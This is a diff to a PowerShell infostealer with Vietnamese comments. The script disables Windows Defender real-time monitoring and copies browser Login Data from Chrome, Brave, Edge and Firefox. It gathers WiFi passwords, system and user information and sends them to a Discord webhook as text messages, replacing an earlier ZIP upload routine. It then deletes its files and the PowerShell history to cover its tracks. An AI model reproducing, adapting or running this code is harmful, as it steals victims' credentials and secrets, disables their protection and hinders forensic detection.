@@ -11,78 +11,39 @@ if (-Not (Test-Path $browserDir)) { New-Item -ItemType Directory -Path $browserD
 
 # Tat Windows Defender
 Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-Add-MpPreference -ExclusionPath "$env:TEMP\" -ErrorAction SilentlyContinue
 
 # ==========================================
-# FUNCTION GUI FILE CHAC CHAN HOAT DONG
+# GUI FILE TXT LEN DISCORD
 # ==========================================
-function Send-DiscordFile {
-    param([string]$FilePath, [string]$Description = "")
+function Send-DiscordTextFile {
+    param([string]$FilePath, [string]$Title = "")
     
     if (-Not (Test-Path $FilePath)) { 
         Write-Host "[-] File not found: $FilePath"
-        return $false
+        return
     }
     
     $fileName = Split-Path $FilePath -Leaf
-    $fileSize = (Get-Item $FilePath).Length
+    $content = Get-Content $FilePath -Raw -ErrorAction SilentlyContinue
     
-    # Discord gioi han 25MB
-    if ($fileSize -gt 25MB) {
-        Write-Host "[-] File too large: $fileName ($([math]::Round($fileSize/1MB,2)) MB)"
-        return $false
+    if ([string]::IsNullOrWhiteSpace($content)) {
+        Write-Host "[-] Empty file: $fileName"
+        return
     }
     
-    Write-Host "[+] Preparing to send: $fileName ($([math]::Round($fileSize/1KB,2)) KB)"
+    # Gioi han 1900 ky tu
+    if ($content.Length -gt 1900) {
+        $content = $content.Substring(0, 1900) + "...[TRUNCATED]"
+    }
+    
+    $message = "**$Title**`n```$content```"
+    $payload = @{ content = $message } | ConvertTo-Json
     
     try {
-        # Doc file bytes
-        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
-        
-        # Tao boundary
-        $boundary = [System.Guid]::NewGuid().ToString()
-        
-        # Tao multipart form data
-        $CRLF = "`r`n"
-        $bodyLines = @()
-        
-        # Content description
-        if ($Description) {
-            $bodyLines += "--$boundary"
-            $bodyLines += "Content-Disposition: form-data; name=`"content`""
-            $bodyLines += ""
-            $bodyLines += $Description
-        }
-        
-        # File content
-        $bodyLines += "--$boundary"
-        $bodyLines += "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`""
-        $bodyLines += "Content-Type: application/octet-stream"
-        $bodyLines += ""
-        $bodyLines += [System.Text.Encoding]::ASCII.GetString($fileBytes)
-        $bodyLines += "--$boundary--"
-        
-        $bodyString = $bodyLines -join $CRLF
-        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyString)
-        
-        # Gui request
-        $result = Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyBytes -ErrorAction Stop
-        
-        Write-Host "[+] Sent successfully: $fileName"
-        return $true
-        
+        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop
+        Write-Host "[+] Sent: $fileName"
     } catch {
-        Write-Host "[-] Failed to send: $fileName - $_"
-        
-        # Cach 2: Gui base64 dang text neu file nho
-        if ($fileSize -lt 1900) {
-            Write-Host "[+] Trying alternative method (base64 text)..."
-            $base64 = [Convert]::ToBase64String($fileBytes)
-            $payload = @{ content = "**$Description**`nFile: $fileName`nContent (base64):`n```$base64```" } | ConvertTo-Json
-            Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
-            Write-Host "[+] Sent as base64: $fileName"
-        }
-        return $false
+        Write-Host "[-] Failed: $fileName"
     }
 }
 
@@ -94,12 +55,8 @@ function CopyBrowserFiles($browserName, $browserDirPath, $filesToCopy) {
     foreach ($file in $filesToCopy) {
         $source = Join-Path -Path $browserDirPath -ChildPath $file
         if (Test-Path $source) {
-            try {
-                Copy-Item -Path $source -Destination $browserDestDir -Force -ErrorAction Stop
-                Write-Host "$browserName - Copied: $file"
-            } catch {
-                Write-Host "$browserName - Failed: $file (locked)"
-            }
+            Copy-Item -Path $source -Destination $browserDestDir -Force -ErrorAction SilentlyContinue
+            Write-Host "$browserName - Copied: $file"
         }
     }
 }
@@ -147,7 +104,7 @@ if (Test-Path $edgeDir) {
 } else { Write-Host "Edge - Not installed" }
 
 # ==========================================
-# 5. SYSTEM INFORMATION
+# 5. SYSTEM INFORMATION (TXT)
 # ==========================================
 Write-Host "[+] Gathering system information..."
 $sysInfoDir = "$destDir\SystemInfo"
@@ -158,7 +115,7 @@ Get-Process | Out-File "$sysInfoDir\process_list.txt" -ErrorAction SilentlyConti
 Get-LocalUser | Where-Object { $_.Enabled } | Out-File "$sysInfoDir\local_users.txt" -ErrorAction SilentlyContinue
 
 # ==========================================
-# 6. WIFI PASSWORDS
+# 6. WIFI PASSWORDS (TXT)
 # ==========================================
 Write-Host "[+] Extracting WiFi passwords..."
 $wifiFile = "$destDir\WiFi_Details.txt"
@@ -175,27 +132,39 @@ foreach ($profile in $wifiProfiles) {
 }
 
 # ==========================================
-# 7. TAO VA GUI FILE ZIP
+# 7. GUI TAT CA FILE TXT LEN DISCORD
 # ==========================================
-Write-Host "[+] Creating ZIP archive..."
+Write-Host "[+] Sending data to Discord..."
 
-# Tao file ZIP
-$zipPath = "$env:TEMP\Exfil_$env:COMPUTERNAME.zip"
-if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
-Compress-Archive -Path "$destDir\*" -DestinationPath $zipPath -CompressionLevel Optimal -Force
+# Gui thong tin target
+Send-DiscordTextFile -FilePath $wifiFile -Title "WiFi Passwords - $env:COMPUTERNAME"
 
-if (Test-Path $zipPath) {
-    $zipSize = [math]::Round((Get-Item $zipPath).Length / 1KB, 2)
-    Write-Host "[+] ZIP created: $zipPath ($zipSize KB)"
-    
-    # Gui qua Discord
-    $description = "Exfiltrated Data from $env:COMPUTERNAME - User: $env:USERNAME - Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-    Send-DiscordFile -FilePath $zipPath -Description $description
-    
-    # Xoa file ZIP sau khi gui
-    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
-} else {
-    Write-Host "[-] Failed to create ZIP file"
+# Gui System Info
+Send-DiscordTextFile -FilePath "$sysInfoDir\computer_info.txt" -Title "Computer Info - $env:COMPUTERNAME"
+Send-DiscordTextFile -FilePath "$sysInfoDir\process_list.txt" -Title "Process List - $env:COMPUTERNAME"
+Send-DiscordTextFile -FilePath "$sysInfoDir\local_users.txt" -Title "Local Users - $env:COMPUTERNAME"
+
+# Gui browser credentials (dang text)
+$browsers = @("Chrome", "Brave", "Edge", "Firefox")
+foreach ($browser in $browsers) {
+    $browserDataDir = "$browserDir\$browser"
+    if (Test-Path $browserDataDir) {
+        $loginDataFile = "$browserDataDir\Login Data"
+        if (Test-Path $loginDataFile) {
+            # Chuyen doi file nhi phan sang text (doc cac ky tu in duoc)
+            $bytes = [System.IO.File]::ReadAllBytes($loginDataFile)
+            $textContent = ""
+            for ($i = 0; $i -lt [Math]::Min(2000, $bytes.Length); $i++) {
+                $c = [char]$bytes[$i]
+                if ([char]::IsControl($c) -or $c -gt 127) { $c = "." }
+                $textContent += $c
+            }
+            $tempFile = "$env:TEMP\temp_$browser.txt"
+            $textContent | Out-File $tempFile
+            Send-DiscordTextFile -FilePath $tempFile -Title "$browser - Login Data (Raw)"
+            Remove-Item $tempFile -Force
+        }
+    }
 }
 
 # ==========================================
@@ -204,8 +173,6 @@ if (Test-Path $zipPath) {
 Write-Host "[+] Cleaning up..."
 Remove-Item $destDir -Recurse -Force -ErrorAction SilentlyContinue
 Clear-History
-
-# Xoa lich su PowerShell
 $historyPath = (Get-PSReadLineOption).HistorySavePath
 if ($historyPath -and (Test-Path $historyPath)) {
     Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
